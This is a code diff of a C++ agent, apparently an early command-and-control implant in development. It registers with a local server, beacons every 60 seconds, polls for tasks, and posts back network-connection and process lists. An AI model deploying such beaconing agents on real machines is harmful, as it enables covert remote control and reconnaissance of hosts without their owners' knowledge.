@@ -14,7 +14,7 @@
 
 using namespace std;
 
-
+int BEACON_FREQUENCY = 60;
 
 
 
@@ -252,8 +252,8 @@ void send_post_request(int sock, const std::string& endpoint, const std::string&
     }
 }
 
-string doPost(string body, int sock, sockaddr_in server_address){
-    sock = create_socket();
+string doPost(string body, sockaddr_in server_address){
+    int sock = create_socket();
     connect_to_server(sock, server_address);
     string endpoint = "api/agent/task/send_result";
     send_post_request(sock, endpoint, body);
@@ -263,6 +263,65 @@ string doPost(string body, int sock, sockaddr_in server_address){
     return response;
 }
 
+int newAgent(sockaddr_in server_address, string ip, string mac){
+    nlohmann::json newAgentData;
+    newAgentData["ip"] = ip;
+    newAgentData["mac"] = mac;
+
+    string body = newAgentData.dump();  
+    
+    int sock = create_socket();
+    connect_to_server(sock, server_address);
+    string endpoint = "/api/new_agent";
+    send_post_request(sock, endpoint, body);
+    string response = receive_response(sock);
+    close(sock);
+    
+
+    size_t json_start_pos = response.find("{");
+    if (json_start_pos != std::string::npos) {
+        std::string json_content = response.substr(json_start_pos);
+        try {
+            nlohmann::json jsonResponse = nlohmann::json::parse(json_content);
+            int agentID = jsonResponse["id"];
+            return agentID;
+        } catch (const std::exception& e) {
+            std::cerr << "Error parsing JSON: " << e.what() << std::endl;
+            return -1;
+        }
+    } else {
+        std::cerr << "Could not find the start of the JSON content." << std::endl;
+        return -1;
+    }
+}
+
+string pollServer(sockaddr_in server_address, int agentID){
+    int sock = create_socket();
+    connect_to_server(sock, server_address);
+
+    std::string requestStr = "GET /api/agent/tasks/pending/" + std::to_string(agentID) + " HTTP/1.1\r\nHOST: localhost\r\nConnection: close\r\n\r\n";
+    const char* request = requestStr.c_str();
+    send_request(sock, request);
+
+    string response_data = receive_response(sock);
+    //cout << "Received Data: \n" << response_data << endl;
+    close(sock);
+    return response_data;
+}
+
+void beacon(sockaddr_in server_address, int agentID){
+    nlohmann::json beaconData;
+    beaconData["agent_id"] = agentID;
+
+    string body = beaconData.dump();  
+    
+    int sock = create_socket();
+    connect_to_server(sock, server_address);
+    string endpoint = "/api/beacon";
+    send_post_request(sock, endpoint, body);
+    string response = receive_response(sock);
+    close(sock);
+}
 
 /*
 END NETWORKING FUNCTIONS
@@ -271,7 +330,7 @@ END NETWORKING FUNCTIONS
 
 
 
-void parse_tasks(const string& response_data, int sock, sockaddr_in server_address) {
+void parse_tasks(const string& response_data, sockaddr_in server_address) {
     size_t json_start_pos = response_data.find("{");
     if (json_start_pos != std::string::npos) {
         std::string json_content = response_data.substr(json_start_pos);
@@ -288,24 +347,22 @@ void parse_tasks(const string& response_data, int sock, sockaddr_in server_addre
                 string timestamp = task[3];
 
                 
-                cout << "Task ID: " << task_id << ", Agent ID: " << agent_id 
-                     << ", Task Name: " << command << ", Timestamp: " << timestamp << endl;
+                //cout << "Task ID: " << task_id << ", Agent ID: " << agent_id 
+                 //    << ", Task Name: " << command << ", Timestamp: " << timestamp << endl;
 
 
                 if(command == "netstat"){
                     nlohmann::json netstatJson = netstat_list(task_id, agent_id);
-                    string response = doPost(netstatJson.dump(), sock, server_address);
+                    string response = doPost(netstatJson.dump(), server_address);
                 }
                 else if(command == "process_list"){
                     nlohmann::json psJson = ps_list(task_id, agent_id);
-                    string response = doPost(psJson.dump(), sock, server_address);
+                    string response = doPost(psJson.dump(), server_address);
                 }
                 else {
                     cout << "No method for this task." <<endl;
                 }
             }
-
-            string body = j.dump();
 
         } catch (const std::exception& e) {
             std::cerr << "Error parsing JSON: " << e.what() << std::endl;
@@ -322,20 +379,24 @@ int main() {
     //Server Connection stuff
     const char* server_host = "127.0.0.1";
     const int server_port = 5000;
-
-    int sock = create_socket();
     sockaddr_in server_address = setup_server_address(server_host, server_port);
-    connect_to_server(sock, server_address);
+    int agentID = newAgent(server_address, "127.0.0.1", "00:00:00:00:00:00");
 
-    const char* request = "GET /api/agent/tasks/pending/2 HTTP/1.1\r\nHOST: localhost\r\nConnection: close\r\n\r\n";
-    send_request(sock, request);
-
-    string response_data = receive_response(sock);
-    cout << "Received Data: \n" << response_data << endl;
-    close(sock);
+    agentID = 2; //override for testing
+  
     
-    //parse Json and send POSTS
-    parse_tasks(response_data, sock, server_address);
+    while(true) {
+
+        //beacon
+        beacon(server_address, agentID);
+        //get tasks from server
+        string response_data = pollServer(server_address, agentID);
+        //parse tasks Json and send POST responses
+        parse_tasks(response_data, server_address);
+
+        this_thread::sleep_for(std::chrono::seconds(BEACON_FREQUENCY));
+    }    
+    
 
 
 
